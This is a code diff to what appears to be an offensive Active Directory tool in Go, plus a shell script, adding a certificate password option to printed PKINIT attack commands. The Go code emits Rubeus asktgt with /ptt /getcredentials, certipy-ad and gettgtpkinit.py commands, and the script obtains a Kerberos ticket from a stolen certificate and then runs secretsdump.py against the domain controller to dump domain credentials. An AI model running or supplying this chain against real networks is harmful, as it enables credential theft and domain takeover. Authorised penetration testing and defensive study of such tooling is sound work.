@@ -12,6 +12,7 @@ type PKINITInfo struct {
 	CertPath  string
 	KeyPath   string
 	PFXPath   string
+	PFXPass   string
 	DC        string
 	Domain    string
 	TargetUPN string
@@ -32,10 +33,14 @@ func PrintPKINITCommands(info *PKINITInfo) {
 		fmt.Printf("    certipy-ad auth -pfx %s -dc-ip <DC_IP> -domain %s\n\n", info.PFXPath, info.Domain)
 
 		fmt.Println("    # Rubeus (from Windows)")
-		fmt.Printf("    Rubeus.exe asktgt /user:%s /certificate:%s /ptt /getcredentials\n\n", user, info.PFXPath)
+		rubeusCmd := fmt.Sprintf("Rubeus.exe asktgt /user:%s /certificate:%s /ptt /getcredentials", user, info.PFXPath)
+		if info.PFXPass != "" {
+			rubeusCmd += fmt.Sprintf(" /password:%s", info.PFXPass)
+		}
+		fmt.Printf("    %s\n\n", rubeusCmd)
 
 		fmt.Println("    # PKINITtools gettgtpkinit.py")
-		fmt.Printf("    python gettgtpkinit.py -cert-pfx %s -pfx-pass '' %s/%s %s.ccache\n\n", info.PFXPath, info.Domain, user, user)
+		fmt.Printf("    python gettgtpkinit.py %s/%s %s.ccache -cert-pfx %s -pfx-pass '%s'\n\n", info.Domain, user, user, info.PFXPath, info.PFXPass)
 	} else if info.CertPath != "" && info.KeyPath != "" {
 		pfxPath := strings.TrimSuffix(info.CertPath, filepath.Ext(info.CertPath)) + ".pfx"
 		fmt.Println("    # Convert to PFX first:")
@@ -80,7 +85,7 @@ fi
 
 if command -v gettgtpkinit.py &>/dev/null; then
     echo "[+] Using PKINITtools gettgtpkinit.py..."
-    python gettgtpkinit.py -cert-pfx "$PFX" -pfx-pass '' "${DOMAIN}/${USER}" "${USER}.ccache"
+    python gettgtpkinit.py "${DOMAIN}/${USER}" "${USER}.ccache" -cert-pfx "$PFX" -pfx-pass ''
     export KRB5CCNAME="${USER}.ccache"
     secretsdump.py -k -no-pass -dc-ip "$DC" "${DOMAIN}/${USER}@${DOMAIN}"
     exit 0
